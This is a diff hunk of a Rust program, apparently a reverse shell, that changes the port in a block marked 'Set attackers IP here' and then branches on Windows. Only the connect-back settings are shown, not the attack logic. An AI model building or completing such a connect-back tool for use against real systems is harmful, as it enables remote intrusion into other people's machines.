@@ -12,7 +12,7 @@ fn main() {
     // TODO Set attackers IP here
     let ip = String::from("127.0.0.1");
     // TODO Set port here
-    let port = String::from("6666");
+    let port = String::from("1337");
 
     if cfg!(target_os = "windows"){
         #[cfg(windows)]
